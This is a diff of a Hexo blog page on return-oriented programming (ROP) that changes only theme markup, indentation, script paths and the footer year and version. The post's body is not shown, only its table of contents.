         <li><strong>Title:</strong> ROP</li>
         <li><strong>Author:</strong> Troy</li>
@@ -742,88 +849,76 @@
     </ul>
 </div>
 
-            </div>
-        
+		</div>
+		
 
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/ROP/">#ROP</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ROP/">#ROP</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
-        
+		
 
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/12/25/%E9%87%8F%E5%AD%90%E5%AF%86%E7%A2%BC/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">量子密碼</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/2024/12/25/OSCP/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">OSCP</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2024/12/25/%E9%87%8F%E5%AD%90%E5%AF%86%E7%A2%BC/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">量子密碼</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2024/12/25/OSCP/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">OSCP</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
 
 
-        
-    </div>
+		
+	</div>
 
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">ROP</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ROP1"><span class="nav-text">ROP1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%88%E5%82%99%E7%9F%A5%E8%AD%98"><span class="nav-text">先備知識</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#outline"><span class="nav-text">outline</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E5%86%8D%E5%B9%B9%E5%98%9B"><span class="nav-text">ROP再幹嘛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROPgadget"><span class="nav-text">ROPgadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP-chain"><span class="nav-text">ROP chain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lab1"><span class="nav-text">Lab1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop-pivot"><span class="nav-text">rop pivot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2plt"><span class="nav-text">ret2plt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2plt-Pt-2"><span class="nav-text">ret2plt Pt.2</span></a></li></ol></li></ol>
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">ROP</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ROP1"><span class="nav-text">ROP1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%88%E5%82%99%E7%9F%A5%E8%AD%98"><span class="nav-text">先備知識</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#outline"><span class="nav-text">outline</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E5%86%8D%E5%B9%B9%E5%98%9B"><span class="nav-text">ROP再幹嘛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROPgadget"><span class="nav-text">ROPgadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP-chain"><span class="nav-text">ROP chain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lab1"><span class="nav-text">Lab1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop-pivot"><span class="nav-text">rop pivot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2plt"><span class="nav-text">ret2plt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2plt-Pt-2"><span class="nav-text">ret2plt Pt.2</span></a></li></ol></li></ol>
 
-    </div>
+	</div>
 </div>
-        </div>
-    
+	</div>
+	
 </div>
+			</div>
 
+			
+		</div>
 
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
     <div class="info-container py-3 text-center">
         
         <div class="text-center">
@@ -832,7 +927,7 @@
               <span>2022</span>
               -
             
-            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Tr0y2ooo</a>
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Tr0y2ooo</a>
             
                 
                 <p class="post-count space-x-0.5">
@@ -862,7 +957,7 @@
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
             <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
         </div>
         
         
@@ -891,91 +986,88 @@
         
     </div>  
 </footer>
-        </div>
-    </div>
+		</div>
+	</div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
 
-        <!-- go comment -->
-        
-    </ul>
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
 </div>
 
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
-</div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
+	
 
 </main>
 
 
-    
-<script src="/js/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
+<script src="/js/build/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
 
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
 
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
 
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
 
 <script>
     const swup = new Swup({
@@ -999,44 +1091,42 @@
 
 
 
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
 
+<script src="/js/build/utils.js" type="module"></script>
 
+<script src="/js/build/main.js" type="module"></script>
 
-<script src="/js/tools/imageViewer.js" type="module"></script>
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
 
-<script src="/js/utils.js" type="module"></script>
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
 
-<script src="/js/main.js" type="module"></script>
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
 
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
 
 
 
 
 
     
-<script src="/js/tools/codeBlock.js" type="module"></script>
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
 
 
 
 
     
-<script src="/js/layouts/lazyload.js" type="module"></script>
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
 
 
 
 
     
-<script src="/js/tools/runtime.js"></script>
+<script src="/js/build/tools/runtime.js"></script>
 
     
-<script src="/js/libs/odometer.min.js"></script>
+<script src="/js/build/libs/odometer.min.js"></script>
 
     
 <link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
@@ -1045,10 +1135,10 @@
 
 
   
-<script src="/js/libs/Typed.min.js"></script>
+<script src="/js/build/libs/Typed.min.js"></script>
 
   
-<script src="/js/plugins/typed.js" type="module"></script>
+<script src="/js/build/plugins/typed.js" type="module"></script>
 
 
 
@@ -1058,37 +1148,41 @@
 
 
     
-<script src="/js/libs/anime.min.js"></script>
+<script src="/js/build/libs/anime.min.js"></script>
 
 
 
 
 
     
-<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
 
-<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
 
-<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
-
-
-
-
-<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
-
-
-<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
 
 
 
 
-    <div id="aplayer"></div>
-
-<script src="/js/libs/APlayer.min.js"></script>
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
 
 
-<script src="/js/plugins/aplayer.js"></script>
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
 
 
+
+
+
+	
+	<div id="aplayer"></div>
+
+<script src="/js/build/libs/APlayer.min.js"></script>
+
+
+<script src="/js/build/plugins/aplayer.js"></script>
+
+
+	
 </body>
+
 </html>
